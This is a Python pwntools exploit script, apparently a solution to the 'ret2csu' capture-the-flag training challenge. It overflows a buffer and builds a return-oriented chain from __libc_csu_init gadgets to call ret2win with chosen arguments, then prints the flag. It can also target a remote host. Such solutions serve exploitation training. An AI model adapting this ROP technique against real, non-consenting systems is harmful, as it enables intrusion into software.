#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2csu')

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *pwnme+152
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def ret2csu():
    offset = 40
    pop_rdi = 0x00000000004006a3 # pop rdi; ret; 
    csu_call = 0x0000000000400680
    csu_pop = 0x000000000040069a
    r15 = 0xd00df00dd00df00d
    r14 = 0xcafebabecafebabe
    r13 = 0xdeadbeefdeadbeef
    r12 = 0x600e30
    rbx = 0x3
    rbp = 0x4
    junk = b'A'*8

    payload = flat({
        offset: [
            csu_pop,
            rbx,
            rbp,
            r12,
            r13,
            r14,
            r15,
            csu_call,
            junk,
            rbx,
            rbp,
            r12,
            r13,
            r14,
            r15,
            pop_rdi,
            r13,
            exe.plt['ret2win']
        ]
    })

    io.sendline(payload)

    io.recvuntil('you!')
    io.recvline()
    flag = io.recv(1024).decode()
    info(f"Flag: {flag}")

    io.close()

def main():
    
    init()
    ret2csu()

if __name__ == '__main__':
    main()